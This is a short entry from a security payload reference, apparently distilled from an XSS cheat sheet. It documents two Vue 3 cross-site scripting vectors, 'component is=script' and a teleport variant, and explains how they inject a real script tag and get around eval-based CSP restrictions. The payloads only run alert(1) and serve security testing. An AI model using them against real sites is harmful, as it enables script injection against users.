---
title: Vue 3 component is=script / teleport to=script
slug: vue3-component-is-script
created_utc: 2026-05-12T00:00:00Z
updated_utc: 2026-05-12T00:00:00Z
tags: [payload, sink/dom-xss, sink/csti, sink/vue3, sink/script-injection]
inbound: []
---

# Vue 3 component is=script / teleport to=script

## Payload

```html
<component is=script text=alert(1)>
```

## Variants

```html
<teleport to=script:nth-child(2)>alert&lpar;1&rpar;</teleport></div><script></script>
```

## Context

Vue 3's `<component>` element resolves its `is` attribute as a native HTML tag name; setting `is=script` renders a `<script>` with inline `text` attribute content. The `<teleport>` variant moves its inner content into an existing `<script>` element matched by CSS selector, appending the HTML-entity-encoded `alert(1)` (entities decoded by the browser before script execution). Both techniques bypass CSP `'unsafe-eval'` / `new Function` restrictions since they inject a proper script tag. The `<teleport>` form requires an existing `<script>` element in the DOM. No user interaction needed.

## Provenance

- Distilled from: `../../techniques/dom-xss/framework-vectors-vue.md`
- Original source: `../../sources/portswigger-xss-cheatsheet.md`

## Linked techniques

- [Vue.js Framework Vectors](../../techniques/dom-xss/framework-vectors-vue.md)
- [Client-Side Template Injection](../../techniques/dom-xss/client-side-template-injection.md)
